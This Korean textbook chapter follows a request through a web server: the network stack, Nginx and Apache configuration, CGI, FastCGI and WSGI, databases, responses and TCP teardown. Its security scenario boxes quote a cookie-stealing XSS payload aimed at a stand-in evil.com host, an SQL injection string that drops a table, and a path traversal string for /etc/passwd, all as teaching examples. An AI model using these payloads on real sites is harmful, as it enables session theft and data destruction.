# Chapter 06. 웹 서버에 도착하여 응답 데이터가 되돌아온다

## 개요

패킷이 최종 목적지인 웹 서버에 도착한 후 어떻게 처리되고 응답이 생성되어 클라이언트로 돌아가는지 전 과정을 다룹니다. 웹 서버의 내부 동작, HTTP 요청 처리, 애플리케이션 실행, 데이터베이스 조회, 응답 생성 및 전송, 그리고 역경로를 통한 패킷 반환까지 실무 사례와 함께 살펴봅니다.

## 목차

1. [웹 서버의 패킷 수신](#1-웹-서버의-패킷-수신)
2. [HTTP 요청 메시지 해석](#2-http-요청-메시지-해석)
3. [애플리케이션 프로그램 실행](#3-애플리케이션-프로그램-실행)
4. [데이터베이스 조회 및 처리](#4-데이터베이스-조회-및-처리)
5. [HTTP 응답 메시지 생성](#5-http-응답-메시지-생성)
6. [응답 패킷의 역경로 전송](#6-응답-패킷의-역경로-전송)

---

## 1. 웹 서버의 패킷 수신

### 웹 서버 소프트웨어

**주요 웹 서버:**

| 웹 서버 | 점유율 | 특징 | 사용처 |
|--------|-------|------|--------|
| Nginx | 34% | 고성능, 비동기 I/O | 정적 콘텐츠, 리버스 프록시 |
| Apache | 31% | 다양한 모듈, 안정성 | 전통적 웹 호스팅 |
| IIS | 7% | Windows 통합 | ASP.NET 애플리케이션 |
| LiteSpeed | 5% | Apache 호환, 빠름 | 워드프레스 최적화 |
| Caddy | 소수 | 자동 HTTPS | 현대적 웹 서비스 |

**웹 서버 아키텍처 비교:**

**Apache (프로세스/스레드 모델):**
```
요청1 → Worker Process 1
요청2 → Worker Process 2
요청3 → Worker Process 3
...
요청100 → Worker Process 100

문제: 프로세스 생성 오버헤드, 메모리 사용량 증가
C10K 문제: 10,000 동시 연결 처리 어려움
```

**Nginx (이벤트 기반 모델):**
```
        [Master Process]
              |
    +---------+---------+
    |         |         |
[Worker 1][Worker 2][Worker 3]
    |         |         |
  Event    Event    Event
   Loop     Loop     Loop
    |         |         |
요청1-100  요청101-200  요청201-300

장점: 적은 메모리, 높은 동시성 처리
```

### 서버의 네트워크 스택 처리

**패킷 수신 과정:**

```
1. NIC (Network Interface Card)
   - 이더넷 프레임 수신
   - DMA로 메모리에 복사
   - 인터럽트 발생
   ↓
2. 링크 계층 (Ethernet)
   - MAC 주소 확인
   - FCS 검증
   - 이더넷 헤더 제거
   ↓
3. 네트워크 계층 (IP)
   - IP 헤더 확인
   - TTL 감소 (라우팅 시)
   - Checksum 검증
   - IP 헤더 제거
   ↓
4. 전송 계층 (TCP)
   - 포트 번호로 소켓 찾기
   - Sequence 번호 확인
   - Checksum 검증
   - TCP 헤더 제거
   - ACK 전송
   ↓
5. 애플리케이션 계층
   - 소켓 버퍼에 데이터 저장
   - recv() 시스템 콜로 데이터 전달
   ↓
6. 웹 서버 프로세스
   - HTTP 메시지 파싱
```

**소켓 수신 대기 과정:**

```
1. socket() - 소켓 생성
2. bind() - IP 주소와 포트 바인딩
3. listen() - 대기 상태 전환, 백로그 큐 설정
4. accept() - 연결 수락, 클라이언트 소켓 생성
5. recv() - 요청 데이터 수신
6. send() - 응답 데이터 전송
7. close() - 연결 종료
```

**AWS 서비스 활용:**

| 웹 서버 개념 | AWS 서비스 | 설명 |
|-------------|-----------|------|
| 웹 서버 호스팅 | **EC2** | 가상 서버에서 Nginx/Apache 실행 |
| 컨테이너 호스팅 | **ECS / EKS** | 컨테이너화된 웹 서버 실행 |
| 서버리스 | **Lambda** | 서버 관리 없이 코드 실행 |
| 관리형 웹 앱 | **Elastic Beanstalk** | 자동 스케일링, 로드 밸런싱 |
| 정적 호스팅 | **S3 + CloudFront** | 정적 웹사이트 호스팅 |

**실무 사례 - listen 백로그 큐:**

```bash
# 백로그 큐 크기 확인
$ ss -lnt
State   Recv-Q Send-Q Local Address:Port  Peer Address:Port
LISTEN  0      128    0.0.0.0:80          0.0.0.0:*
             ^^^^
          백로그 큐

# 시스템 최대값 확인
$ sysctl net.core.somaxconn
net.core.somaxconn = 4096

# 증가 (고트래픽 환경)
$ sudo sysctl -w net.core.somaxconn=65535
```

### 웹 서버 설정

**Nginx 기본 설정:**

```nginx
# /etc/nginx/nginx.conf
user www-data;
worker_processes auto;  # CPU 코어 수만큼 자동
pid /run/nginx.pid;

events {
    worker_connections 10000;  # Worker당 최대 연결 수
    use epoll;  # Linux에서 효율적인 이벤트 메커니즘
    multi_accept on;  # 여러 연결 동시 수락
}

http {
    # 기본 설정
    sendfile on;  # 커널 레벨 파일 전송 (zero-copy)
    tcp_nopush on;  # sendfile과 함께 사용
    tcp_nodelay on;  # Nagle 알고리즘 비활성화
    keepalive_timeout 65;  # Keep-Alive 타임아웃
    types_hash_max_size 2048;

    # MIME 타입
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    # 로그 형식
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';

    access_log /var/log/nginx/access.log main;
    error_log /var/log/nginx/error.log warn;

    # Gzip 압축
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css text/xml text/javascript
               application/json application/javascript application/xml+rss;

    # 가상 호스트
    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}
```

**가상 호스트 설정:**

```nginx
# /etc/nginx/sites-available/example.com
server {
    listen 80;
    listen [::]:80;
    server_name example.com www.example.com;

    # HTTP → HTTPS 리다이렉트
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name example.com www.example.com;

    # 루트 디렉터리
    root /var/www/example.com/html;
    index index.html index.htm index.php;

    # SSL 인증서
    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # 보안 헤더
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # 정적 파일
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf|eot)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
        access_log off;
    }

    # PHP-FPM
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
    }

    # 애플리케이션 서버 프록시
    location /api/ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # 404 오류 페이지
    error_page 404 /404.html;
    location = /404.html {
        internal;
    }

    # 50x 오류 페이지
    error_page 500 502 503 504 /50x.html;
    location = /50x.html {
        internal;
    }

    # 숨김 파일 접근 차단
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
}

# 심볼릭 링크 생성
# sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
```

**Apache 설정:**

```apache
# /etc/apache2/sites-available/example.com.conf
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/example.com/html

    # 로그
    ErrorLog ${APACHE_LOG_DIR}/example.com-error.log
    CustomLog ${APACHE_LOG_DIR}/example.com-access.log combined

    # 디렉터리 설정
    <Directory /var/www/example.com/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # PHP 설정
    <FilesMatch \.php$>
        SetHandler "proxy:unix:/run/php/php8.1-fpm.sock|fcgi://localhost"
    </FilesMatch>
</VirtualHost>

<VirtualHost *:443>
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/example.com/html

    # SSL
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/example.com.crt
    SSLCertificateKeyFile /etc/ssl/private/example.com.key
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite HIGH:!aNULL:!MD5

    # HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
</VirtualHost>

# 사이트 활성화
# sudo a2ensite example.com
# sudo systemctl reload apache2
```

---

## 2. HTTP 요청 메시지 해석

### HTTP 요청 메시지 구조 재확인

**HTTP/1.1 요청:**
```http
POST /api/users HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Content-Type: application/json
Content-Length: 58
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Connection: keep-alive

{"name":"John Doe","email":"john@example.com","age":30}
```

**파싱 과정:**

```
1. 요청 라인 파싱
   "POST /api/users HTTP/1.1" → method="POST", path="/api/users", version="HTTP/1.1"

2. 헤더 파싱 (CRLF로 분리)
   "Host: api.example.com" → headers["host"] = "api.example.com"
   "Content-Type: application/json" → headers["content-type"] = "application/json"

3. 빈 줄(CRLF CRLF)로 헤더/본문 구분

4. 본문 파싱 (Content-Length만큼 읽기)
   Content-Type에 따라 JSON, Form-data 등 파싱
```

> ⚠️ **보안 시나리오 - HTTP Request Smuggling:**
> 프록시와 백엔드 서버가 HTTP 요청을 다르게 파싱하면 요청 스머글링 공격이 가능합니다. `Content-Length`와 `Transfer-Encoding: chunked` 헤더가 동시에 존재할 때, 서버마다 다른 해석으로 인해 공격자가 다른 사용자의 요청에 악성 데이터를 주입할 수 있습니다.

### URL 라우팅

**정적 파일 라우팅:**
```
요청: GET /images/logo.png
      ↓
파일 시스템: /var/www/html/images/logo.png
      ↓
파일 존재 → 200 OK, 파일 전송
파일 없음 → 404 Not Found
```

**동적 라우팅 패턴:**

```
라우팅 유형:
┌─────────────────┬────────────────────┬──────────────────┐
│ 유형            │ 예시               │ 매칭             │
├─────────────────┼────────────────────┼──────────────────┤
│ 정적 경로       │ /api/users         │ 정확히 일치      │
│ 동적 파라미터   │ /users/:id         │ /users/123       │
│ 쿼리 파라미터   │ /search?q=keyword  │ URL 쿼리스트링   │
│ 와일드카드      │ /files/*           │ /files/a/b/c     │
│ 정규식          │ /users/[0-9]+      │ 숫자만 매칭      │
└─────────────────┴────────────────────┴──────────────────┘

미들웨어 체인:
요청 → 로깅 → 인증 → 권한 확인 → 라우트 핸들러 → 응답
```

**AWS 서비스 활용:**

| 라우팅 개념 | AWS 서비스 | 설명 |
|------------|-----------|------|
| URL 라우팅 | **API Gateway** | 경로별 Lambda/HTTP 엔드포인트 매핑 |
| 로드 밸런싱 라우팅 | **ALB** | 경로/호스트 기반 라우팅 규칙 |
| 서버리스 API | **Lambda + API Gateway** | 경로별 함수 실행 |
| 마이크로서비스 | **App Mesh** | 서비스 간 트래픽 라우팅 |
| 정적 파일 라우팅 | **S3 + CloudFront** | 오리진 경로 매핑 |

> ⚠️ **보안 시나리오 - 경로 순회 공격 (Path Traversal):**
> 잘못된 라우팅 설정에서 `../../../etc/passwd` 같은 경로로 파일 시스템 접근이 가능합니다. 사용자 입력이 파일 경로에 직접 사용되면 서버의 민감한 파일이 노출될 수 있습니다.

### 요청 검증 및 보안

**주요 보안 위협과 방어:**

| 공격 유형 | 설명 | 방어 방법 |
|----------|------|----------|
| **SQL Injection** | 쿼리에 악성 SQL 삽입 | 파라미터 바인딩 (Prepared Statement) |
| **XSS** | 악성 스크립트 삽입 | HTML 이스케이프, CSP 헤더 |
| **CSRF** | 사용자 권한으로 위조 요청 | CSRF 토큰, SameSite 쿠키 |
| **Command Injection** | 시스템 명령어 삽입 | 입력 검증, 화이트리스트 |

```
입력 검증 흐름:
┌────────────────────────────────────────────────────────────┐
│ 1. 타입 검증: 숫자, 문자열, 이메일 형식 확인               │
│ 2. 범위 검증: 길이 제한, 값 범위 확인                      │
│ 3. 패턴 검증: 정규식으로 허용된 문자만 통과                │
│ 4. 비즈니스 검증: 중복 확인, 권한 확인                     │
└────────────────────────────────────────────────────────────┘
```

**AWS 서비스 활용:**

| 보안 개념 | AWS 서비스 | 설명 |
|----------|-----------|------|
| SQL Injection 방어 | **WAF** | SQL Injection 규칙 세트 적용 |
| XSS 방어 | **WAF** | XSS 패턴 매칭 규칙 |
| Rate Limiting | **WAF + API Gateway** | 요청 속도 제한 |
| 입력 검증 | **API Gateway** | 요청 검증 스키마 |
| 봇 방어 | **WAF Bot Control** | 자동화된 공격 차단 |
| DDoS 방어 | **Shield Advanced** | L7 DDoS 완화 |

> ⚠️ **보안 시나리오 - SQL Injection:**
> `?id=1; DROP TABLE users;--` 같은 입력이 직접 쿼리에 삽입되면 데이터베이스가 삭제될 수 있습니다. 모든 사용자 입력은 파라미터 바인딩을 통해 쿼리와 분리해야 합니다.

> ⚠️ **보안 시나리오 - Stored XSS:**
> 공격자가 게시판에 `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`를 저장하면, 해당 페이지를 보는 모든 사용자의 세션 쿠키가 탈취됩니다.

---

## 3. 애플리케이션 프로그램 실행

### CGI (Common Gateway Interface)

**CGI 동작 원리:**
```
1. 웹 서버가 HTTP 요청 수신
2. CGI 프로그램 실행 (fork + exec)
3. 환경 변수로 요청 정보 전달
4. 프로그램 실행 및 출력
5. 웹 서버가 출력을 HTTP 응답으로 변환
6. 프로그램 종료
```

**CGI 환경 변수:**

| 환경 변수 | 설명 | 예시 |
|----------|------|------|
| `REQUEST_METHOD` | HTTP 메서드 | GET, POST |
| `QUERY_STRING` | URL 쿼리 파라미터 | name=john&age=30 |
| `CONTENT_TYPE` | 요청 본문 타입 | application/json |
| `CONTENT_LENGTH` | 요청 본문 길이 | 256 |
| `REMOTE_ADDR` | 클라이언트 IP | 203.0.113.50 |
| `HTTP_HOST` | 호스트 헤더 | www.example.com |
| `SCRIPT_NAME` | 스크립트 경로 | /cgi-bin/script.cgi |

**CGI 설정 (Apache):**

```apache
<Directory /var/www/cgi-bin>
    Options +ExecCGI
    AddHandler cgi-script .cgi .pl .py
    Require all granted
</Directory>

ScriptAlias /cgi-bin/ /var/www/cgi-bin/
```

**CGI 문제점:**
- 매 요청마다 프로세스 생성 → 느림, 메모리 낭비
- 확장성 부족

### FastCGI

**FastCGI 개선점:**
- 프로세스 재사용 (프로세스 풀)
- 지속적인 연결
- 높은 성능

**PHP-FPM (FastCGI Process Manager):**

```bash
# PHP-FPM 설치
$ sudo apt install php8.1-fpm

# 설정 - /etc/php/8.1/fpm/pool.d/www.conf
[www]
user = www-data
group = www-data
listen = /run/php/php8.1-fpm.sock
listen.owner = www-data
listen.group = www-data
listen.mode = 0660

pm = dynamic
pm.max_children = 50
pm.start_servers = 5
pm.min_spare_servers = 5
pm.max_spare_servers = 35

# PHP-FPM 재시작
$ sudo systemctl restart php8.1-fpm

# 상태 확인
$ sudo systemctl status php8.1-fpm
```

**Nginx + PHP-FPM 연동:**

```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.php index.html;

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;

        # 또는 TCP 소켓
        # fastcgi_pass 127.0.0.1:9000;

        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

### WSGI (Web Server Gateway Interface)

**WSGI 동작 원리:**

```
┌─────────────────────────────────────────────────────────────┐
│                    WSGI 인터페이스                          │
├─────────────────────────────────────────────────────────────┤
│ 웹 서버 (Nginx/Apache)                                      │
│     ↓                                                       │
│ WSGI 서버 (Gunicorn/uWSGI)                                  │
│     ↓                                                       │
│ WSGI 애플리케이션 (Flask/Django)                            │
│     ↓                                                       │
│ application(environ, start_response)                        │
│   - environ: 요청 정보 (METHOD, PATH, QUERY_STRING 등)      │
│   - start_response: 상태 코드, 헤더 설정 함수               │
│   - return: 응답 본문 (iterable)                            │
└─────────────────────────────────────────────────────────────┘
```

**AWS 서비스 활용:**

| 애플리케이션 실행 방식 | AWS 서비스 | 설명 |
|---------------------|-----------|------|
| CGI/FastCGI | **EC2** | PHP-FPM, Perl CGI 실행 |
| WSGI (Python) | **Elastic Beanstalk** | Gunicorn 자동 설정 |
| 서버리스 | **Lambda** | 요청당 함수 실행 |
| 컨테이너 | **ECS / Fargate** | Docker 컨테이너로 애플리케이션 실행 |
| 쿠버네티스 | **EKS** | Pod 단위 애플리케이션 배포 |

**Gunicorn (WSGI 서버):**

```bash
# Gunicorn 설치
$ pip install gunicorn

# 실행
$ gunicorn -w 4 -b 0.0.0.0:8000 app:application
# -w 4: 4개 워커 프로세스
# -b: 바인딩 주소

# 설정 파일 - gunicorn.conf.py
workers = 4
worker_class = 'sync'  # 또는 'gevent', 'eventlet'
bind = '0.0.0.0:8000'
keepalive = 5
timeout = 30
accesslog = '/var/log/gunicorn/access.log'
errorlog = '/var/log/gunicorn/error.log'
loglevel = 'info'
```

**Nginx + Gunicorn:**

```nginx
upstream app_server {
    server 127.0.0.1:8000 fail_timeout=0;
}

server {
    listen 80;
    server_name example.com;

    location / {
        proxy_pass http://app_server;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Host $http_host;
        proxy_redirect off;
    }
}
```

### 비동기 처리

**동기 vs 비동기 처리:**

```
동기 처리 (Blocking):
┌────────────────────────────────────────────────────┐
│ 요청1 → [처리 100ms] → 완료                        │
│                        요청2 → [처리 100ms] → 완료 │
│                                           요청3... │
│ 총 시간: 200ms+ (순차 처리)                        │
└────────────────────────────────────────────────────┘

비동기 처리 (Non-Blocking):
┌────────────────────────────────────────────────────┐
│ 요청1 → [I/O 대기] → 완료                          │
│ 요청2 → [I/O 대기] → 완료  (동시 처리)             │
│ 요청3 → [I/O 대기] → 완료                          │
│ 총 시간: 100ms (병렬 처리)                         │
└────────────────────────────────────────────────────┘
```

**비동기 처리 비교:**

| 기술 | 언어/프레임워크 | 특징 |
|-----|----------------|------|
| Event Loop | Node.js | 단일 스레드, 콜백 기반 |
| asyncio | Python (aiohttp) | 코루틴 기반 비동기 |
| Reactive | Java (WebFlux) | Publisher/Subscriber 패턴 |
| Goroutine | Go | 경량 스레드 (그린 스레드) |
| Actor | Erlang/Elixir | 메시지 패싱 모델 |

> ⚠️ **보안 시나리오 - Slowloris 공격:**
> 비동기 서버도 커넥션 수 제한이 있습니다. 공격자가 수천 개의 연결을 열고 아주 느리게 데이터를 보내면 서버의 연결 슬롯이 고갈되어 정상 사용자가 접속할 수 없게 됩니다.

---

## 4. 데이터베이스 조회 및 처리

### 데이터베이스 연결

**Connection Pool (연결 풀):**

```
연결 풀 동작:
┌────────────────────────────────────────────────────────────┐
│ Connection Pool (min=2, max=10)                            │
│ ┌────┐ ┌────┐ ┌────┐ ┌────┐ ┌────┐                        │
│ │연결1│ │연결2│ │연결3│ │연결4│ │ .. │                        │
│ └────┘ └────┘ └────┘ └────┘ └────┘                        │
│   ↑       ↑       ↑                                        │
│  요청1   요청2   요청3  (연결 재사용)                       │
└────────────────────────────────────────────────────────────┘

연결 풀 없이: 요청당 연결 생성/종료 (오버헤드 큼)
연결 풀 사용: 미리 생성된 연결 재사용 (빠름)
```

| 설정 항목 | 설명 | 권장 값 |
|----------|------|--------|
| `pool_size` | 기본 연결 수 | CPU 코어 수 × 2 |
| `max_overflow` | 추가 허용 연결 | pool_size와 동일 |
| `pool_timeout` | 연결 대기 시간 | 30초 |
| `pool_recycle` | 연결 재생성 주기 | 1800초 (30분) |

**AWS 서비스 활용:**

| 데이터베이스 개념 | AWS 서비스 | 설명 |
|-----------------|-----------|------|
| 관계형 DB | **RDS** | MySQL, PostgreSQL, Oracle 관리형 |
| 연결 풀링 | **RDS Proxy** | 연결 풀 자동 관리, Lambda 최적화 |
| NoSQL | **DynamoDB** | 서버리스 키-값 저장소 |
| 인메모리 캐시 | **ElastiCache** | Redis, Memcached |
| 문서 DB | **DocumentDB** | MongoDB 호환 |
| 그래프 DB | **Neptune** | 관계 기반 데이터 |

### 쿼리 최적화

**N+1 문제:**

```
N+1 문제 발생:
┌────────────────────────────────────────────────────────────┐
│ 1. SELECT * FROM users;                  (1 쿼리)          │
│ 2. SELECT * FROM posts WHERE user_id=1;  (N 쿼리)          │
│ 3. SELECT * FROM posts WHERE user_id=2;                    │
│ 4. SELECT * FROM posts WHERE user_id=3;                    │
│ ...                                                        │
│ 100명 사용자 = 101개 쿼리 (심각한 성능 저하)               │
└────────────────────────────────────────────────────────────┘

해결: Eager Loading (JOIN)
┌────────────────────────────────────────────────────────────┐
│ SELECT * FROM users                                        │
│ LEFT JOIN posts ON users.id = posts.user_id;               │
│ → 1개 쿼리로 모든 데이터 조회                              │
└────────────────────────────────────────────────────────────┘
```

**인덱스 사용:**

```sql
-- 인덱스 생성
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_posts_user_id ON posts(user_id);

-- 복합 인덱스
CREATE INDEX idx_users_name_age ON users(name, age);

-- EXPLAIN으로 쿼리 분석
EXPLAIN SELECT * FROM users WHERE email = 'john@example.com';
```

**캐싱 전략:**

```
Cache-Aside 패턴:
┌────────────────────────────────────────────────────────────┐
│ 1. 캐시 확인 (Redis GET)                                   │
│    ├─ HIT → 캐시 데이터 반환                               │
│    └─ MISS ↓                                               │
│ 2. DB 조회                                                 │
│ 3. 캐시 저장 (Redis SETEX + TTL)                           │
│ 4. 데이터 반환                                             │
└────────────────────────────────────────────────────────────┘

캐시 무효화:
- 데이터 변경 시 관련 캐시 삭제 (Cache Invalidation)
- TTL 만료 시 자동 삭제
```

### 트랜잭션 처리

```
트랜잭션 ACID 속성:
┌─────────────┬───────────────────────────────────────────┐
│ Atomicity   │ 전체 성공 또는 전체 롤백                  │
│ Consistency │ 트랜잭션 전후 데이터 일관성 유지          │
│ Isolation   │ 동시 트랜잭션 간 격리                     │
│ Durability  │ 커밋된 데이터 영구 저장                   │
└─────────────┴───────────────────────────────────────────┘

계좌 이체 예시:
BEGIN TRANSACTION;
  UPDATE accounts SET balance = balance - 100 WHERE id = 1;
  UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;  -- 둘 다 성공해야 적용
```

> ⚠️ **보안 시나리오 - 데이터베이스 연결 문자열 노출:**
> 소스 코드에 DB 접속 정보가 하드코딩되면 Git 저장소를 통해 유출될 수 있습니다. 환경 변수나 AWS Secrets Manager 같은 비밀 관리 서비스를 사용해야 합니다.

> ⚠️ **보안 시나리오 - 캐시 포이즈닝:**
> Redis에 인증 없이 접근 가능하면 공격자가 캐시된 사용자 데이터를 조작할 수 있습니다. 캐시에 악성 데이터를 주입하면 모든 사용자에게 조작된 정보가 제공됩니다.

---

## 5. HTTP 응답 메시지 생성

### 상태 코드 선택

**RESTful API 상태 코드 가이드:**

| 코드 | 이름 | 사용 시기 |
|------|------|-----------|
| 200 | OK | GET, PUT 성공 |
| 201 | Created | POST로 리소스 생성 성공 |
| 204 | No Content | DELETE 성공 (본문 없음) |
| 400 | Bad Request | 잘못된 요청 형식 |
| 401 | Unauthorized | 인증 필요 |
| 403 | Forbidden | 권한 없음 |
| 404 | Not Found | 리소스 없음 |
| 409 | Conflict | 충돌 (중복 이메일 등) |
| 422 | Unprocessable Entity | 검증 실패 |
| 500 | Internal Server Error | 서버 오류 |
| 503 | Service Unavailable | 서버 과부하 |

**RESTful API 응답 패턴:**

```
성공 응답:
┌────────────────────────────────────────────────────────────┐
│ GET /api/users/123                                         │
│ → 200 OK + { "id": 123, "name": "John" }                   │
│                                                            │
│ POST /api/users                                            │
│ → 201 Created + { "id": 456 } + Location 헤더              │
│                                                            │
│ DELETE /api/users/123                                      │
│ → 204 No Content (본문 없음)                               │
└────────────────────────────────────────────────────────────┘

에러 응답:
┌────────────────────────────────────────────────────────────┐
│ 404 Not Found      → { "error": "User not found" }         │
│ 400 Bad Request    → { "error": "Email is required" }      │
│ 409 Conflict       → { "error": "Email already exists" }   │
│ 500 Internal Error → { "error": "Server error" }           │
└────────────────────────────────────────────────────────────┘
```

### 응답 헤더 설정

**필수 보안 헤더:**

| 헤더 | 값 | 목적 |
|-----|-----|-----|
| `X-Content-Type-Options` | nosniff | MIME 스니핑 방지 |
| `X-Frame-Options` | SAMEORIGIN | Clickjacking 방지 |
| `X-XSS-Protection` | 1; mode=block | XSS 필터 활성화 |
| `Strict-Transport-Security` | max-age=31536000 | HTTPS 강제 (HSTS) |
| `Content-Security-Policy` | default-src 'self' | 리소스 로드 제한 |

**CORS (Cross-Origin Resource Sharing):**

```
CORS 동작:
1. 브라우저가 OPTIONS 요청 (Preflight)
2. 서버가 허용 헤더로 응답
3. 실제 요청 진행

Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 3600
```

**AWS 서비스 활용:**

| 응답 개념 | AWS 서비스 | 설명 |
|----------|-----------|------|
| 보안 헤더 | **CloudFront Response Headers** | 글로벌 보안 헤더 적용 |
| CORS | **API Gateway** | CORS 자동 설정 |
| 캐시 헤더 | **CloudFront** | Cache-Control, ETag 관리 |
| 응답 변환 | **Lambda@Edge** | 응답 헤더/본문 동적 수정 |

> ⚠️ **보안 시나리오 - CORS 미설정:**
> CORS 헤더 없이 API를 오픈하면 모든 도메인에서 접근 가능합니다. 공격자 사이트에서 사용자의 세션으로 API를 호출하여 민감한 정보를 탈취할 수 있습니다.

### 콘텐츠 압축

**압축 알고리즘 비교:**

| 알고리즘 | 압축률 | 속도 | 브라우저 지원 |
|---------|-------|------|--------------|
| **Gzip** | 70-90% | 보통 | 모든 브라우저 |
| **Brotli** | 80-95% | 느림 | 최신 브라우저 |
| **Deflate** | 65-85% | 빠름 | 대부분 |

```
압축 효과:
원본 JSON: 500 KB
Gzip:       50 KB (90% 감소)
Brotli:     35 KB (93% 감소)

Content-Encoding: gzip
Accept-Encoding: gzip, deflate, br
```

### 응답 스트리밍

**스트리밍 유형:**

```
1. 파일 다운로드 스트리밍:
┌────────────────────────────────────────────────────────────┐
│ 전체 로딩 방식: 파일 전체 메모리에 로드 → 전송              │
│   → 1GB 파일 = 1GB 메모리 사용 (비효율)                    │
│                                                            │
│ 청크 스트리밍: 4KB씩 읽어서 전송 (chunk by chunk)           │
│   → 메모리 사용량 일정 (효율적)                            │
└────────────────────────────────────────────────────────────┘

2. Server-Sent Events (SSE):
┌────────────────────────────────────────────────────────────┐
│ Content-Type: text/event-stream                            │
│                                                            │
│ data: {"message": "Hello"}\n\n                             │
│ data: {"message": "World"}\n\n                             │
│ → 실시간 알림, 주식 시세, 채팅 등                          │
└────────────────────────────────────────────────────────────┘

3. Chunked Transfer Encoding:
Transfer-Encoding: chunked
→ Content-Length 없이 동적 크기 응답
```

**AWS 서비스 활용:**

| 스트리밍 유형 | AWS 서비스 | 설명 |
|-------------|-----------|------|
| 파일 다운로드 | **S3 + CloudFront** | Range 요청 지원, 대용량 파일 |
| 실시간 스트리밍 | **API Gateway WebSocket** | 양방향 통신 |
| 이벤트 스트림 | **Kinesis** | 대용량 실시간 데이터 |
| 미디어 스트리밍 | **MediaLive** | 라이브 비디오 스트리밍 |

---

## 6. 응답 패킷의 역경로 전송

### 응답 전송 과정

**전체 흐름:**

```
1. 애플리케이션 계층
   - HTTP 응답 메시지 생성
   - send() 시스템 콜
   ↓
2. 전송 계층 (TCP)
   - TCP 세그먼트 생성
   - Sequence 번호 설정
   - TCP 헤더 추가
   ↓
3. 네트워크 계층 (IP)
   - 출발지 IP: 서버 IP
   - 목적지 IP: 클라이언트 IP
   - IP 헤더 추가
   ↓
4. 데이터 링크 계층 (Ethernet)
   - 출발지 MAC: 서버 MAC
   - 목적지 MAC: 게이트웨이 MAC (ARP 조회)
   - 이더넷 헤더 추가
   ↓
5. 물리 계층
   - 전기/광 신호로 변환
   - NIC를 통해 전송
```

**역경로 라우팅:**

```
[서버]
  ↓ (로컬 게이트웨이)
[라우터 1] ← 라우팅 테이블 조회
  ↓
[라우터 2] ← 라우팅 테이블 조회
  ↓
[라우터 3] ← 라우팅 테이블 조회
  ↓
[ISP 게이트웨이]
  ↓
[클라이언트]
```

### TCP 연결 종료

**정상 종료 (4-Way Handshake):**

```
서버                          클라이언트

1. 데이터 전송 완료
   send() 완료
   ↓
2. 클라이언트가 FIN 전송
   (애플리케이션이 close() 호출)
                              FIN
   ←---------------------------
   ↓
3. 서버 ACK 응답
   ACK
   ---------------------------→
   ↓
4. 서버도 FIN 전송
   (애플리케이션 close() 또는 완료)
   FIN
   ---------------------------→
   ↓
5. 클라이언트 ACK 응답
                              ACK
   ←---------------------------
   ↓
[CLOSED]                     [TIME_WAIT]
                              (2MSL 대기)
                              ↓
                            [CLOSED]
```

**Keep-Alive (연결 유지):**

```http
# HTTP/1.1 (기본 Keep-Alive)
GET /page1.html HTTP/1.1
Host: www.example.com
Connection: keep-alive

HTTP/1.1 200 OK
Connection: keep-alive
Keep-Alive: timeout=5, max=100
Content-Length: 1234

<content>

# 같은 연결로 다음 요청
GET /page2.html HTTP/1.1
Host: www.example.com
Connection: keep-alive
```

**실무 설정 (Nginx):**

```nginx
http {
    # Keep-Alive 설정
    keepalive_timeout 65;  # 65초 동안 유지
    keepalive_requests 100;  # 최대 100개 요청

    # Upstream Keep-Alive
    upstream backend {
        server 192.168.1.10:8080;
        keepalive 32;  # 백엔드 연결 32개 유지
    }

    server {
        location / {
            proxy_pass http://backend;
            proxy_http_version 1.1;
            proxy_set_header Connection "";  # Keep-Alive 활성화
        }
    }
}
```

### 성능 최적화

